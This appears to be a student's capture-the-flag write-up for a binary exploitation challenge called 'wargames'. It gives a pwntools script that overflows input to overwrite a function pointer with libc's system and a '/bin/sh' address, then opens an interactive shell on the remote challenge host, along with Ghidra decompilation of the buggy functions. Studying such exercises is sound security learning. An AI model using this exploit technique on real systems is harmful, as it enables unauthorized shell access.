connect to port on ssh
```bash
nc cs4401shell.walls.ninja 39448
```

Code:
CPE 1704 TKS
System: 0x7ffff7a523a0

start of buf: 0x007fffffffdca0

start of load_chess: 0x007fffffffdeb0

start of play_chess: 0x007fffffffde80

## Solution:
```python
from pwn import *
import os

elf = ELF('./wargames')
context.binary=elf
context.arch = 'amd64'

debug_mode=True

offset = 503-8 #503 is the offset from the function pointer (we know because the cyclic is printed out in the loading) 503-8 is the offset

system = 0x7ffff7a523a0

bin_sh = 0x7ffff7b99e57

exploit_str = flat({offset:bin_sh}, system)

  
  

dbg = cyclic(1024, n=8)

# print(dbg)
# print(cyclic_find(b'aaaaaacn', n=8, endian='little'))
# dbg2 = flat({offset:0xdeadbeef})

p = remote('cs4401shell.walls.ninja', 39448)

  
# p = gdb.debug('./wargames', gdbscript = '''
# b *main
# shell tmux select-layout main-vertical
# shell tmux swap-pane -U
# b *input_code
# b *input_code+236
# b *load_chess
# b *play_chess
# ''')

p.sendline(b'y')
p.sendline(b'y')
p.sendline(b'CPE 1704 TKS') #enters the code
p.sendline(b'y' + exploit_str)

p.recv(numb=50)
p.interactive()
```

Decompiled code from Ghidra:

```c
void input_code(void)

{
  int iVar1;
  char buffer [16];
  char str [1024];
  int i;
  
  for (i = 0; i < 0x400; i = i + 1) {
    str[i] = '\0';
  }
  fgets(buffer,0x10,stdin);
  printf("You entered %s\n",buffer);
  iVar1 = strncmp(buffer,_code,0xc);
  if (iVar1 != 0) {
    type_string("Launch code incorrect...");
    sleep(1);
    type_string("sequence aborted!\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  type_string("Missiles launched...\n");
  sleep(1);
  type_string("How about a nice game of chess? [Y/n] ");

	//here is the bug
	//info isn't removed and 
  fgets(str,0x400,stdin); 
  if (((str[0] != 'Y') && (str[0] != 'y')) && (str[0] != '\n')) {
    done();
  }
  return;
}
```
`play_chess`
```c
void play_chess(char *str,int size)

{
  char *arg;
  _func_void_char_ptr *fun_ptr;
  
  snprintf(str,(long)size,"Loading (%p): ",fun_ptr);
  type_string(str);
  sleep(1);
  (*fun_ptr)(arg);
  return;
}
```
## Patching binary
include a libc.2.23 file and ld.2.23 file
